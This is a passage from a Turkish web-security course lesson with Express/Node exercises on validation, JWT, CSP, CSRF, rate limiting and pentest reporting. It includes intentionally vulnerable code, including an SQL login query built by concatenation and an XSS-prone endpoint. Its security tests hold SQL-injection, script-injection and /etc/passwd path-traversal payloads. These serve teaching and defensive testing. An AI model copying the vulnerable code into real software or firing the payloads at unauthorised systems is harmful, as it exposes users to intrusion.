const DOMPurify = createDOMPurify(new JSDOM("").window);

// Zod ile input validation
const userSchema = z.object({
  name: z.string().min(2).max(50).regex(/^[a-zA-ZğüşıöçĞÜŞİÖÇ\s]+$/),
  email: z.string().email().max(255),
  bio: z.string().max(500).transform(val => DOMPurify.sanitize(val)),
  age: z.number().int().min(13).max(120),
  website: z.string().url().optional().refine(
    url => !url || url.startsWith("https://"),
    "Sadece HTTPS URL kabul edilir"
  ),
});

app.post("/api/users", (req, res) => {
  const result = userSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() });
  }
  // result.data guvenli ve dogrulanmis
  // TODO: SQL injection icin parameterized query kullan
});

// TODO: File upload icin MIME type ve boyut kontrolu ekle
// TODO: URL redirect icin whitelist kontrolu ekle (open redirect korunma)
// TODO: JSON payload boyut limiti ekle (DoS korunma)
```

**Beklenen Sonuc:** Gecersiz input'larda anlamli hata mesajlari donmeli. HTML tag'leri sanitize edilmeli. Script injection girisimi engellenimeli.
**Ipucu:** "Validate input, encode output" prensibi. Zod ile type-safe validation yap, DOMPurify ile HTML temizle.

---

### Alistirma 7: JWT Guvenligi ve Token Yonetimi (Orta)

Guvenli JWT implementasyonu yap: token rotation, blacklisting, refresh token.

```javascript
const jwt = require("jsonwebtoken");

// Access token (kisa omurlu)
function generateAccessToken(user) {
  return jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_ACCESS_SECRET,
    { expiresIn: "15m", algorithm: "HS256" }
  );
}

// Refresh token (uzun omurlu, DB'de sakla)
function generateRefreshToken(user) {
  const token = jwt.sign(
    { id: user.id, tokenVersion: user.tokenVersion },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: "7d" }
  );
  // TODO: Refresh token'i DB'ye kaydet (revoke edebilmek icin)
  return token;
}

// Token refresh endpoint
app.post("/api/auth/refresh", async (req, res) => {
  const { refreshToken } = req.cookies;
  // TODO: Refresh token'i dogrula ve DB'deki versiyonla karsilastir
  // TODO: Yeni access + refresh token cifti uret (token rotation)
  // TODO: Eski refresh token'i invalidate et
});

// TODO: Logout'ta refresh token'i blacklist'e ekle
// TODO: Tum cihazlardan cikis yap (tokenVersion artir)
// TODO: JWT payload'da hassas bilgi olmadigini dogrula
```

**Beklenen Sonuc:** Access token 15 dakikada expire olmali. Refresh token ile yeni access token alinabilmeli. Logout sonrasi refresh token kullanilamamali.
**Ipucu:** JWT'de sifre, kredi karti gibi hassas bilgi SAKLAMA — payload Base64 encoded, encrypted degil. Token rotation ile calinti refresh token'in omrunu kisalt.

---

### Alistirma 8: Dependency Vulnerability Scanning (Orta)

Proje bagimliklarindaki güvenlik aciklarina karsi tarama ve otomatik guncelleme kur.

```bash
# 1. Manuel tarama
pnpm audit
pnpm audit --fix

# 2. pip icin
pip audit
pip install --upgrade vulnerable-package

# 3. GitHub Actions ile otomatik tarama
```

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  schedule:
    - cron: '0 8 * * 1'  # Her Pazartesi sabah 8
  push:
    branches: [main]

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pnpm audit --audit-level moderate
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

# TODO: Dependabot yapilandirmasi ekle (.github/dependabot.yml)
# TODO: Kritik guvenlik guncellemeleri icin otomatik PR acilmasini sagla
# TODO: License compliance kontrolu ekle (lisans uyumlulugu)
# TODO: SBOM (Software Bill of Materials) olustur
```

**Beklenen Sonuc:** Haftalik otomatik güvenlik taramasi çalışmali. Kritik aciklarda bildirim gelmeli. Dependabot PR'lari otomatik acilmali.
**Ipucu:** `pnpm audit --audit-level critical` ile sadece kritik aciklari goster. Snyk free tier acik kaynak projeler icin sinisrsiz.

---

### Alistirma 9: Content Security Policy Detayli Yapılandırma (Zor)

Siki bir CSP politikasi yapilandir ve XSS saldirilarini engelle.

```javascript
const helmet = require("helmet");

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{RANDOM}'"],
    styleSrc: ["'self'", "'unsafe-inline'"], // Tailwind icin gerekli
    imgSrc: ["'self'", "data:", "https://cdn.example.com"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: [],
  },
}));

// Nonce-based CSP icin middleware
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.nonce = nonce;
  // TODO: CSP header'daki nonce'u dinamik olarak set et
  next();
});

// TODO: CSP violation raporlamasi icin report-uri endpoint'i ekle
// TODO: Report-only mode ile CSP'yi test et (engellemeden raporla)
// TODO: Inline script'leri nonce veya hash ile whitelist et
// TODO: Third-party script'ler icin strict CSP kurallari yaz
```

**Beklenen Sonuc:** CSP header response'da gorunmeli. Inline script'ler nonce olmadan calisamamali. CSP violation'lari raporlanmali.
**Ipucu:** Oncelikle `Content-Security-Policy-Report-Only` ile test et, site bozulmadan kurallari ayarla. `report-uri` ile ihlalleri topla.

---

### Alistirma 10: Penetration Testing Simulasyonu (Zor)

Kendi uygulamana temel penetrasyon testi uygula.

```bash
# 1. OWASP ZAP ile otomatik tarama (Docker ile)
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://your-app.com -r report.html

# 2. Manuel test senaryolari
```

```javascript
// test/security/penetration.test.js
describe("Guvenlik Testleri", () => {
  test("SQL injection girisimi engellenmeli", async () => {
    const res = await request(app)
      .post("/api/login")
      .send({ email: "' OR 1=1 --", password: "anything" });
    expect(res.status).toBe(400); // gecersiz email formati
  });

  test("XSS payload'i sanitize edilmeli", async () => {
    const res = await request(app)
      .post("/api/comments")
      .send({ text: '<script>alert("xss")</script>' });
    expect(res.body.text).not.toContain("<script>");
  });

  test("Path traversal engellenmeli", async () => {
    const res = await request(app).get("/api/files/../../etc/passwd");
    expect(res.status).toBe(400);
  });

  // TODO: IDOR (Insecure Direct Object Reference) testi
  // TODO: Mass assignment testi (beklenmeyen field'lar gondererek)
  // TODO: HTTP method tampering testi (GET ile DELETE islemi)
  // TODO: Header injection testi
});
```

**Beklenen Sonuc:** Tum saldiri girisilemleri engellenimeli. ZAP taramasinda yuksek riskli bulgu olmamali. Test raporunda her saldiri vektoru icin sonuc bulunmali.
**Ipucu:** OWASP ZAP ucretsizdir ve CI/CD'ye entegre edilebilir. Penetrasyon testini SADECE kendi uygulamana yap, baskalarinin sistemine izinsiz test etme.
:::

:::exercise
### Alistirma 11: XSS Saldirisi Tespiti ve Onleme (Kolay)

Cross-Site Scripting (XSS) acigini tespit et ve onle.

```javascript
// Guvensiz kod — XSS acigi var!
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Arama sonuclari: ${query}</h1>`);
});

// TODO: Guvenli versiyonunu yaz
// 1. DOMPurify veya he kutuphanesi ile input sanitize et
// 2. Content-Security-Policy header ekle
// 3. Template engine ile auto-escaping aktif et
// 4. HttpOnly cookie kullan
```

**Beklenen Sonuc:** Script injection denemesi engellenmeli. CSP header'i inline script'leri bloklayabilmeli.
**Ipucu:** Stored XSS en tehlikelisidir — veritabanina kaydedilir. Output encoding + CSP birlikte kullan.
:::

:::exercise
### Alistirma 12: SQL Injection Onleme (Kolay)

SQL Injection acigini bul ve parametrized query ile duzelt.

```javascript
// Guvensiz kod — SQL Injection acigi!
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  // ' OR '1'='1' -- ile bypass edilebilir!

  // TODO: Parametrized query ile yeniden yaz
  // const result = await db.query(
  //   'SELECT * FROM users WHERE username = $1 AND password = $2',
  //   [username, password]
  // );
  // TODO: ORM kullanarak ayni sorguyu yaz (Prisma/Drizzle)
  // TODO: Input validation ekle (zod ile)
});
```

**Beklenen Sonuc:** SQL injection denemesi basarisiz olmali. Parametrized query kullanilmali.
**Ipucu:** ASLA string concatenation ile SQL yazma. ORM kullanmak bile %100 guvenli degildir — raw query'lerde parametrize et.
:::

:::exercise
### Alistirma 13: CSRF Token Implementasyonu (Kolay)

Cross-Site Request Forgery korunmasini uygula.

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// TODO: CSRF middleware'ini route'lara ekle
// app.get('/transfer', csrfProtection, (req, res) => {
//   res.render('transfer', { csrfToken: req.csrfToken() });
// });

// TODO: Form'da hidden input ile CSRF token gonder
// TODO: SameSite cookie attribute'u ekle
// TODO: Double Submit Cookie pattern'ini uygula
```

**Beklenen Sonuc:** CSRF token olmadan POST istekleri reddedilmeli. Token her form icin unique olmali.
**Ipucu:** SameSite=Strict cookie'ler cross-site isteklerde gonderilmez. Modern tarayicilarda SameSite=Lax varsayilandir.
:::

:::exercise
### Alistirma 14: Security Headers Konfigurasyonu (Orta)

Temel guvenlik header'larini Helmet ile uygula.

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  // TODO: HSTS konfigur et (maxAge: 1 yil, includeSubDomains)
  // TODO: X-Frame-Options ayarla
  // TODO: Referrer-Policy ekle
}));

// TODO: securityheaders.com ile sonucu test et
// TODO: Her header'in ne yaptigini aciklayan yorum yaz
```

**Beklenen Sonuc:** securityheaders.com'da A+ notu alinmali. Tum guvenlik header'lari tanimli olmali.
**Ipucu:** CSP'yi report-only modda baslat, hatalari izle, sonra enforce moduna gec.
:::

:::exercise
### Alistirma 15: Rate Limiting ve Brute Force Korumasi (Orta)

API'ye rate limiting ve brute force korumasi ekle.

```javascript
const rateLimit = require('express-rate-limit');

// Genel rate limiter
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Cok fazla istek, lutfen bekleyin.'
});

// TODO: Login icin daha siki rate limiter olustur (5 deneme/15dk)
// TODO: Redis-backed rate limiter (distributed systems icin)
// TODO: Account lockout mekanizmasi ekle
// TODO: Progressive delay (her basarisiz denemede artan bekleme)
// TODO: IP-based ve user-based rate limiting birlestir
```

**Beklenen Sonuc:** 5 basarisiz login denemesinden sonra gecici engel uygulanmali. API dakikada 100 istekle sinirlanmali.
**Ipucu:** Redis-backed rate limiter coklu sunucuda tutarli calisir. `express-slow-down` ile progressive delay uygula.
:::

:::exercise
### Alistirma 16: Input Validation ve Sanitization (Orta)

Zod ile kapsamli input validation sablonu olustur.

```typescript
import { z } from 'zod';

const registerSchema = z.object({
  email: z.string().email('Gecerli email giriniz'),
  password: z.string()
    .min(8, 'En az 8 karakter')
    .regex(/[A-Z]/, 'En az bir buyuk harf')
    .regex(/[0-9]/, 'En az bir rakam')
    .regex(/[^A-Za-z0-9]/, 'En az bir ozel karakter'),
  name: z.string().min(2).max(50),
  // TODO: Telefon numarasi validasyonu ekle
  // TODO: XSS iceren string'leri reddet
});

// TODO: Validation middleware yaz
// TODO: File upload validasyonu ekle (boyut, tip, icerik kontrolu)
// TODO: API response'larda da sensitive data filtrele
```

**Beklenen Sonuc:** Gecersiz input'lar anlamli hata mesajlariyla reddedilmeli. XSS payload'lari engellenmeli.
**Ipucu:** Zod hem runtime validation hem TypeScript type inference saglar. Server-side validation ZORUNLU.
:::

:::exercise
### Alistirma 17: JWT Guvenlik Best Practices (Orta)

JWT token yonetimini guvenli sekilde uygula.

```typescript
// TODO: Access + Refresh token sistemi kur
// Access token: 15dk, RS256
// Refresh token: 7 gun, tek kullanimlik (rotation)

// TODO: Token rotation uygula
// TODO: Token blacklist mekanizmasi (logout icin Redis ile)
// TODO: Token payload'ina hassas veri KOYMA
// TODO: Symmetric (HS256) vs Asymmetric (RS256) karsilastirmasi yaz
// TODO: Cookie vs Authorization header karsilastirmasi yaz
```

**Beklenen Sonuc:** Access token 15 dakikada expire olmali. Refresh token rotation calismali. Logout'ta token gecersiz olmali.
**Ipucu:** RS256 ile public key'i dogrulama icin dagitabilirsin (microservices). HS256 tek servis icin uygun.
:::

:::exercise
### Alistirma 18: OWASP Top 10 Denetim Kontrol Listesi (Zor)

Bir uygulamayi OWASP Top 10'a karsi denetle.

```markdown
# OWASP Top 10 (2021) Denetim Kontrol Listesi

## A01: Broken Access Control
- [ ] Her endpoint'te yetkilendirme kontrolu var mi?
- [ ] IDOR korunmasi var mi?

## A02: Cryptographic Failures
- [ ] Hassas veriler sifreleniyor mu (at rest + in transit)?

## A03: Injection
- [ ] Tum SQL sorgulari parametrize mi?

## TODO: A04-A10 icin kontrol maddeleri ve test senaryolari yaz
## Her kategori icin en az 2 test senaryosu ekle
```

**Beklenen Sonuc:** 10 kategorinin hepsi icin kontrol maddeleri olmali. Her kategori icin en az 2 test senaryosu yazilmali.
**Ipucu:** OWASP Testing Guide (OTG) her kategori icin detayli test yontemleri icerir. ZAP ile otomatik + manuel test birlestir.
:::

:::exercise
### Alistirma 19: Penetrasyon Testi Raporu Yazma (Zor)

Bir web uygulamasi icin penetrasyon testi raporu olustur.

```markdown
# TODO: Asagidaki sablonu kullanarak rapor yaz

## 1. Yonetici Ozeti
- Tarama tarihi, bulunan zafiyet sayisi, risk degerlendirmesi

## 2. Metodoloji
- Araclar: OWASP ZAP, Burp Suite, nikto, nmap

## 3. Bulgular (her biri icin):
- Ciddiyet: Kritik/Yuksek/Orta/Dusuk
- Konum, Aciklama, Kanit (PoC), Cozum Onerisi, Referans

## TODO: En az 5 bulgu icin detayli rapor yaz
## TODO: CVSS puani hesapla
## TODO: Oncelik sirasina gore cozum yol haritasi olustur
```

**Beklenen Sonuc:** Profesyonel formatta pentest raporu hazirlanmali. Her bulgu icin PoC ve cozum onerisi olmali.
**Ipucu:** CVSS ile bulgu ciddiyet puani hesapla. Yonetici ozeti teknik olmayan kisiler icin yazilmali.
:::


:::ai-guidance
## Bu Derste AI ile Ogren

**Onerilen Model:** Claude Opus 4.6 (derin anlayis icin) veya Sonnet 4.5 (hizli sorular icin)

### Prompt Örnekleri

**1. Derinlemesine Anla:**
> "OWASP Top 10 (2021) listesinideki ilk 5 güvenlik acigini (Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration) gercek saldiri senaryolariyla acikla. Her biri icin nasil tespit edilir ve nasil onlenir? Express.js ve React'te hangi middleware/practice'ler kullanilir?"

**2. Pratik Uygulama:**
> "Bir web uygulamasinda XSS (Stored, Reflected, DOM-based), SQL Injection ve CSRF saldirilarini canli örneklerle goster. Her saldiri icin savunmasiz kodu yaz, sonra guvenli versiyonunu oluştur. CSP (Content Security Policy) header'ini, parameterized queries'i ve CSRF token mekanizmasini implemente et."
> Takip: "Simdi Helmet.js ile HTTP güvenlik header'larini konfigure et ve CORS politikasini production icin ayarla. Her header'in ne korudugunu acikla."

**3. Mukemmellik Icin:**
> "Bir SaaS urununde defense-in-depth güvenlik stratejisi tasarliyorum. Input validation, output encoding, CSP, CORS, rate limiting, dependency scanning (Snyk/pnpm audit), SAST/DAST araclari, penetration testing ve bug bounty programini katmanli bir güvenlik mimarisi olarak planla."

### Pair Programming Ipucu
Güvenlik kodu yazarken AI'a kodunu goster ve sor: "Bu endpoint'te güvenlik acigi var mi? OWASP Top 10'a gore denetle. XSS, injection, broken access control veya security misconfiguration riski tasiyor mu? Guvenli versiyonunu yaz."
:::

:::must-note
## Defterine Yaz!

1. **SQL Injection Korunma:** ASLA string concatenation ile SQL yazma! Her zaman parameterized query (`$1`, `?` placeholder) veya ORM kullan. Bu kural NoSQL (MongoDB) için de geçerli.

2. **XSS Korunma Üçlüsü:** (1) Output encoding (he.encode), (2) Content Security Policy header, (3) HttpOnly cookie flag. React kullansan bile `dangerouslySetInnerHTML` XSS'e açıktır.

3. **Password Hashing:** bcrypt (salt rounds: 12) veya Argon2id kullan. MD5 ve SHA-256 ASLA şifre hash'leme için kullanılmamalı - saniyede milyarlarca deneme yapılabilir!

4. **CSRF Korunma:** SameSite cookie (`strict` veya `lax`) + CSRF token. Cookie-based auth kullanıyorsan CSRF koruması ZORUNLU. JWT Bearer token CSRF'e bağışıktır.

5. **Güvenlik Header'ları:** `app.use(helmet())` - her Express uygulamasının MUTLAKA kullanması gereken ilk middleware. HSTS, CSP, X-Frame-Options hepsini tek satırda ekler.
:::

:::senior-learns
## Senior/CTO Böyle Öğrenir

Senior developer web security öğrenirken:

1. **Threat modeling yapar:** STRIDE modeli ile her feature'ın potansiyel tehditlerini analiz eder. "Bu endpoint'e kim erişebilir?", "Input nasıl manipüle edilebilir?", "Veri akışında nereler zayıf?" sorularını sorar.

2. **Defense-in-depth uygular:** Tek bir güvenlik katmanına güvenmez. Network (firewall) + Application (WAF) + Code (validation) + Data (encryption) + Monitoring (alerting) katmanlarının hepsini kurar.

3. **Compliance gereksinimlerini bilir:** KVKK, GDPR, PCI-DSS, SOC 2, HIPAA gibi standartların teknik gereksinimlerini anlar ve uygular. Kişisel verilerin saklanması, işlenmesi ve silinmesi süreçlerini tasarlar.

4. **Security testing entegre eder:** CI/CD pipeline'a SAST (static analysis), DAST (dynamic analysis), SCA (software composition analysis) araçlarını ekler. Penetration testing yaptırır. Bug bounty programı oluşturur.

5. **Incident response planı hazırlar:** Veri sızıntısı durumunda: (1) Tespit, (2) İzolasyon, (3) İnceleme, (4) Müdahale, (5) Bildirim, (6) İyileştirme adımlarını tanımlar. Tabletop exercise'ler yapar.

**Karar Verme Süreci — Güvenlik Yatirimi Onceliklendirme:**
- **Input validation + parameterized queries**: Maliyet dusuk, etki cok yuksek. SQL Injection ve XSS'in %95'ini engeller. Bunu yapmayan hic bir proje production'a cikmamali.
- **Authentication/Authorization**: JWT vs session, RBAC vs ABAC karari. Trade-off: JWT stateless ama revoke etmek zor (kisa expiry + refresh token ile coz). Session server-side state gerektirir ama aninda revoke edilir. Senior karar: "Microservice mi? JWT. Monolith mi? Session. Ikisi de mi? BFF pattern ile session frontend'e, JWT service'ler arasinda."
- **WAF (Web Application Firewall)**: Cloudflare, AWS WAF gibi servisler. Trade-off: False positive'ler legitimate trafigi engelleyebilir, konfigurasyonu uzmanlik gerektirir. Ama bilinen saldiri pattern'lerini otomatik engeller. Production'da olmasi gereken minimum güvenlik katmani.
- **Penetration testing**: Yilda en az 1 kez professional pentest. Trade-off: Pahali ($5K-50K) ama bir data breach'in maliyeti $4M+ (IBM 2025 raporuna gore). Bug bounty programi daha ucuz ve surekli test saglar.

**Anti-pattern Farkindaligi:**
- **"Security through obscurity"**: API endpoint'lerini gizleyerek güvenlik saglamaya çalışmak. Hacker zaten tum endpoint'leri brute-force ile veya JS bundle'dan bulur. Her endpoint authentication + authorization + input validation olmali.
- **Client-side validation'a guvenmek**: Frontend'de "admin" rolunu kontrol edip butonu gizlemek. Kullanici DevTools'tan butonu gorunur yapar veya direkt API'ye istek atar. Validation MUTLAKA server-side olmali.
- **Logging'de sensitive data**: `console.log(user)` ile password hash'ini, token'i loga yazmak. Log aggregation servisleri (Datadog, ELK) bu verileri indexler ve arama yapilabilir hale getirir. PII masking ve structured logging kullan.

**Gercek Dunya Deneyimi:** Bir e-ticaret sitesinde XSS acigi vardi — urun yorumlarinda script calisiyordu. Saldirgan diger kullanicilarin session cookie'lerini calip admin paneline eristi, 50K kullanicinin verisini cekti. Maliyet: KVKK cezasi, hukuk masraflari, itibar kaybi. Toplam hasar tahmini: 500K+ TL. CSP header + DOMPurify + HttpOnly cookie ile 2 saatte kapatilabilecek bir acikti. Ders: güvenlik "sonra yapariz" dediginde en pahali "sonra" oluyor.

**CTO bakış açısı:** "Güvenlik bütçesi yeterli mi?", "Security team vs security champions modeli?", "Vendor security assessment süreci?", "Cyber insurance gerekli mi?", "Regulatory risk nedir?". Güvenliği iş riski perspektifinden değerlendirir.
:::

:::knowledge-check
1. SQL Injection'ı önlemenin en etkili yolu nedir?
2. Stored XSS ile Reflected XSS arasındaki fark nedir?
3. CSRF token neden çalışır? Saldırgan neden token'ı tahmin edemez?
4. bcrypt'in MD5'ten daha güvenli olmasının teknik sebebi nedir?
5. Content Security Policy hangi tür saldırıları engeller?
:::

:::external-resource
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - En kritik web güvenlik riskleri
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Güvenlik best practice referansı
- [Helmet.js](https://helmetjs.github.io/) - Express güvenlik header'ları
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) - Web güvenlik temelleri
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Interaktif güvenlik eğitimi
- [HackTheBox](https://www.hackthebox.com/) - Pratik güvenlik laboratuvarı
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/) - En tehlikeli yazılım zayıflıkları
:::
